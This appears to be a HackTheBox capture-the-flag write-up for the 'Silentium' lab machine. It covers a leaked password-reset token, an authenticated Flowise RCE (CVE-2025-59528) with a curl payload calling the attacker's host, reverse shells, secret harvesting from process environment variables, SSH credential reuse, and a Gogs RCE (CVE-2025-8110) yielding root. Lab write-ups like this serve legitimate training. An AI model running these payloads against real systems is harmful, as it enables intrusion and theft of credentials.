---
title: "Silentium @ HackTheBox"
date: 2026-04-09 09:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [ctf, linux, flowise, cve-2025-59528, gogs, cve-2025-8110, rce, information-disclosure]
author: andrea
image:
  path: /commons/silentium.png
  no_bg: true
---


## Enumeration

Start with classical nmap scans:

```text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We perform subdomain enumeration using ffuf:

```bash
ffuf -c -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --fs 178
```

This reveals the following subdomain:

```text
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 26ms]
```

Inspecting the website, we find a user named ben listed under the Leadership page. We issue a POST request to the password reset endpoint `/api/v1/account/forgot-password` with ben@silentium.htb:

```http
POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
Content-Length: 38
x-request-from: internal
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://staging.silentium.htb
Referer: http://staging.silentium.htb/forgot-password
Connection: keep-alive

{"user":{"email":"ben@silentium.htb"}}
```

Response:

```http
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 24 Jul 2026 15:33:45 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Access-Control-Allow-Origin: http://staging.silentium.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-C2L85v8Xz06BUIihJahRlq7SkGo"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"kmql3zl5aMWZrwajpGKbTy3rsmMTAQGt5nqGM6rE88sNoorC2DCjA1nfUWhQRWKN","tokenExpiry":"2026-07-24T15:48:45.023Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-07-24T15:33:45.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

The server leaks a tempToken in the HTTP response. We can bypass cracking the bcrypt hash `$2a$05$6o1ngPjXiRj...` by using this token to set a new password directly:

```bash
curl -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
-H "Content-Type: application/json" \
-H "Accept: application/json, text/plain, */*" \
-d '{
  "user": {
    "email": "ben@silentium.htb",
    "tempToken": "kmql3zl5aMWZrwajpGKbTy3rsmMTAQGt5nqGM6rE88sNoorC2DCjA1nfUWhQRWKN",
    "password": "NewPassword123!"
  }
}'
```

Now we can log into the web panel using `ben@silentium.htb:NewPassword123!` at `http://staging.silentium.htb`.

## Exploitation

The underlying application is Flowise v3.0.5, which is vulnerable to CVE-2025-59528 (Authenticated RCE via CustomMCP Node).

Alternatively to using a PoC script, the manual exploitation payload targets `/api/v1/node-load-method/customMCP`:

```bash
curl -X POST "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer <JWT_TOKEN>" \
-H "x-request-from: internal" \
-d '{
  "LoadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x: (function(){const cp = process.mainModule.require(\"child_process\"); cp.execSync(\"curl 10.10.15.122:8000\"); return 1;})()})"
  }
}'
```

We execute the automated PoC script CVE-2025-59528-POC:

```bash
python3 exploit.py -t http://staging.silentium.htb --mode revshell --lhost 10.10.15.122 --lport 1337 --email "ben@silentium.htb" --password "NewPassword123!"
```

```text
[*] Target: http://staging.silentium.htb
[*] Mode:   revshell
[*] Auth: JWT login (ben@silentium.htb)
[+] Authentication successful

[*] Auto mode — trying bash, nc, and python reverse shells
[!] Start your listener first: nc -lvnp 1337

[*] Sending bash reverse shell → 10.10.15.122:1337
    Delivered (HTTP 200)
[*] Sending nc reverse shell → 10.10.15.122:1337
    Delivered (HTTP 200)
[*] Sending python reverse shell → 10.10.15.122:1337
    Delivered (HTTP 200)

[*] All payloads sent. Check your listener!
[*] exec() is async — the server responds immediately even on success.
```

Catching the reverse shell:

```text
➜  ~ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.122] from (UNKNOWN) [10.129.88.205] 45401
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root) groups=0(root)
```

We find ourselves inside a Docker container. Checking the environment variables gives us sensitive information:

```bash
strings /proc/$(pgrep -f flowise)/environ 2>/dev/null | grep -i "secret\|key\|pass"
```

```text
FLOWISE_PASSWORD=F1l3_d0ck3r
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SECRETKEY_PATH=/root/.flowise
SMTP_PASSWORD=r04D!!_R4ge
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
```

We note the variable SMTP_PASSWORD=r04D!!_R4ge. Assuming a case of credential reuse, we attempt to access the main host via SSH using the user 'ben' and the discovered password (r04D!!_R4ge):


```text
➜  ~ ssh ben@silentium.htb
ben@silentium.htb's password:
[...]
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
```

## Privilege Escalation

Checking active internal listening ports:

```text
ben@silentium:/$ netstat -tulnp
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8025          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:41995         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
```

Port 3001 hosts an internal Gogs service (staging-v2-code.dev.silentium.htb). Port 8025 is also locally exposed (Mailhog/SMTP service). We port forward port 3001:

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

The Gogs application running on port 3001 is vulnerable to CVE-2025-8110 (Authenticated Remote Code Execution via Symlink + sshCommand Injection).

The exploit requires a valid user account. We access the web interface at [http://staging-v2-code.dev.silentium.htb:3001/user/sign_up](http://staging-v2-code.dev.silentium.htb:3001/user/sign_up) and register a test account (username: test, password: test).

Next, we configure the global Git credentials on our local machine:

```bash
git config --global user.email "test@test.com"
git config --global user.name "test"
```

We set up a listener on port 9001 and execute the exploit script:

```text
python3 CVE-2025-8110-RCE.py -u http://staging-v2-code.dev.silentium.htb:3001 -lh 10.10.15.122 -lp 9001 -p 'test'
```

```text 
   _____ _____   _____
  / ____|  __ \ / ____|
 | |  __| |__) | |  __
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____|

CVE-2025-8110 - Gogs Remote Code Execution
Authenticated RCE via Symlink + sshCommand Injection

Author : ghxtsec
Based on: zAbuQasem original PoC
------------------------------------------------

[+] Login exitoso
Repo creation status: 201
[+] Repo creado: 7a901fa611e4
Clonando con URL: http://test:test@staging-v2-code.dev.silentium.htb/test/7a901fa611e4.git
[master cf0fb89] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 3 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 291 bytes | 291.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://staging-v2-code.dev.silentium.htb/test/7a901fa611e4.git
   90e348f..cf0fb89  master -> master
[+] Symlink subido y pusheado correctamente
```

Checking our listener gives us direct root execution:

```text
➜  ~ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.122] from (UNKNOWN) [10.129.88.205] 58708
bash: cannot set terminal process group (1492): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# id
uid=0(root) gid=0(root) groups=0(root)
```
